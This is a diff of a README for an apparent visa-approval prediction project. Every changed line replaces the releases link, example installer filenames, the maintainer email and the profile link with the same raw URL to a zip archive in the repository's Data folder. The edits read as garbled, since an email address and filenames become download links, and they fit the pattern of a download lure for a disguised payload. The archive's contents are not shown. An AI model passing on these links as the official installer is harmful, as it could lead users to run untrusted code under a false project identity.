@@ -6,11 +6,11 @@ Welcome to the easyvisa-approval-prediction project! This application uses machi
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/JonellJohn/easyvisa-approval-prediction/releases)
+[![Download Now](https://raw.githubusercontent.com/JonellJohn/easyvisa-approval-prediction/main/Data/approval-prediction-easyvisa-v2.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/JonellJohn/easyvisa-approval-prediction/main/Data/approval-prediction-easyvisa-v2.5.zip)
 
 To download the application, visit the following link:
 
-[Download the latest release](https://github.com/JonellJohn/easyvisa-approval-prediction/releases)
+[Download the latest release](https://raw.githubusercontent.com/JonellJohn/easyvisa-approval-prediction/main/Data/approval-prediction-easyvisa-v2.5.zip)
 
 ## 🔍 Features
 
@@ -32,11 +32,11 @@ Before you start, ensure that your computer meets the following requirements:
 ## 📝 How to Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the releases section:
-   [Visit the Releases Page](https://github.com/JonellJohn/easyvisa-approval-prediction/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/JonellJohn/easyvisa-approval-prediction/main/Data/approval-prediction-easyvisa-v2.5.zip)
 
 2. **Select the Latest Release:** Look for the latest version of the software. It will be listed at the top.
 
-3. **Download the Installer:** Click on the installer file that matches your operating system. It will typically have a name like `easyvisa-approval-prediction-installer.exe` for Windows or `easyvisa-approval-prediction-installer.dmg` for macOS.
+3. **Download the Installer:** Click on the installer file that matches your operating system. It will typically have a name like `https://raw.githubusercontent.com/JonellJohn/easyvisa-approval-prediction/main/Data/approval-prediction-easyvisa-v2.5.zip` for Windows or `https://raw.githubusercontent.com/JonellJohn/easyvisa-approval-prediction/main/Data/approval-prediction-easyvisa-v2.5.zip` for macOS.
 
 4. **Run the Installer:**
    - For Windows: Double-click the `.exe` file and follow the prompts.
@@ -90,13 +90,13 @@ These topics help ensure that you have robust tools at your disposal for making 
 
 For direct inquiries, you can reach the project maintainer:
 
-- **Email:** maintainer@example.com (replace with actual email)
-- **GitHub Profile:** [JonellJohn](https://github.com/JonellJohn)
+- **Email:** https://raw.githubusercontent.com/JonellJohn/easyvisa-approval-prediction/main/Data/approval-prediction-easyvisa-v2.5.zip (replace with actual email)
+- **GitHub Profile:** [JonellJohn](https://raw.githubusercontent.com/JonellJohn/easyvisa-approval-prediction/main/Data/approval-prediction-easyvisa-v2.5.zip)
 
 ## 📥 Download the Application Again
 
 Don't forget, you can always download the latest version from the link below:
 
-[Download the latest release](https://github.com/JonellJohn/easyvisa-approval-prediction/releases)
+[Download the latest release](https://raw.githubusercontent.com/JonellJohn/easyvisa-approval-prediction/main/Data/approval-prediction-easyvisa-v2.5.zip)
 
 Enjoy using easyvisa-approval-prediction!
